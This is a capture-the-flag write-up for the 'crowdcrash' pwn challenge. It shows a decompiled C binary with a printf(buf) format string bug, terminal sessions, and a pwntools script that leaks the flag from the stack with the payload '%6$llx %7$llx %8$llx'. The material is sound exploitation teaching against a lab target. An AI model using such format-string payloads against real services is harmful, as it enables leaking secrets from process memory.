# crowdcrash

[library.m0unt41n.ch/challenges/crowdcrash](https://library.m0unt41n.ch/challenges/crowdcrash) ![](../../resources/pwn.svg) ![](../../resources/easy.svg) 

# TL;DR

We get a simple `chall` binary, with a direct format string vulnerability.

# Decompilation

```c
int main(int argc, const char **argv, const char **envp) {
  char flagCopy[128]; // [rsp+0h] [rbp-110h] BYREF
  char buf[136]; // [rsp+80h] [rbp-90h] BYREF
  char *flag; // [rsp+108h] [rbp-8h]

  setbuf(stdin, 0LL);
  puts("Welcome to CrowdCrash Log Analyzer v1.0");
  puts("Due to the recent update, some reports are inaccessible.");
  printf("Enter your log query to retrieve system status: ");
  fgets(buf, 128, stdin);
  flag = getenv("FLAG");
  puts("Processing your log query...");
  strncpy(flagCopy, flag, 0x80uLL);
  flagCopy[127] = 0;
  printf(buf);
  if ( !strncmp(buf, flagCopy, 0x80uLL) )
    puts("Access Granted: Flag Retrieved!");
  else
    puts("Access Denied: Query Invalid!");
  return 0;
}
```

There is a `printf(buf)`, so, we can inject arbitrary
format string. What's more, in context of that `printf`,
the flag is argument #1 &#128578; And indeed:

```
$ export FLAG=flag{test_flag}
$ ./chall
Welcome to CrowdCrash Log Analyzer v1.0
Due to the recent update, some reports are inaccessible.
Enter your log query to retrieve system status: %s
Processing your log query...
flag{test_flag}
Access Denied: Query Invalid!
```

# Remote flag

For some reason, I could not reproduce that in the remote instance.

```
$ ncat --ssl 979e671f-73dc-45bc-a4b6-6fa82d112bd9.library.m0unt41n.ch 31337
Welcome to CrowdCrash Log Analyzer v1.0
Due to the recent update, some reports are inaccessible.
Enter your log query to retrieve system status: %s
Processing your log query...

Ncat: Input/output error.
```

So, I had to fish that data in more convoluted way. I ended up plucking the bytes
directly from the buffer on stack. Trying various indexes in the format string, I
figured out that these are `%6$llx`, `%7$llx` and `%8$llx`, ended up with the exploit:

```
$ ncat --ssl 979e671f-73dc-45bc-a4b6-6fa82d112bd9.library.m0unt41n.ch 31337
Welcome to CrowdCrash Log Analyzer v1.0
Due to the recent update, some reports are inaccessible.
Enter your log query to retrieve system status: %6$llx %7$llx %8$llx
Processing your log query...
6d7230667b444353 31765f30745f7434 7d7972307463
Access Denied: Query Invalid!
```

These qwords 
[look mostly ASCII](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NmQ3MjMwNjY3YjQ0NDM1MyAzMTc2NWYzMDc0NWY3NDM0IDdkNzk3MjMwNzQ2Mw),
but, let's do it proper:

# Exploit

```python
import pwn
import time

pwn.context(arch='amd64', os='linux', encoding='ascii', log_level='warning')

io = pwn.remote('98335abd-e11d-41e9-95e5-1275f9268be5.library.m0unt41n.ch', 31337, ssl=True)
print(io.recvuntilS(b"Enter your log query to retrieve system status: "), end="")
payload = b'%6$llx %7$llx %8$llx'
print(payload.decode('ascii'))
io.sendline(payload)
print(io.recvuntilS(b"Processing your log query...\n"), end="")
result = [int.from_bytes(bytes.fromhex(i), byteorder="big") for i in io.recvlineS().strip().split(" ")]
for qword in result:
  for p in range(8):
    c = qword & 0xFF
    if c==0:
      print("")
      break
    print(chr(qword & 0xFF), end="")
    qword >>= 8
print(io.recvall().decode('ascii'))
```

---

# `SCD{f0rm4t_t0_v1ct0ry}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
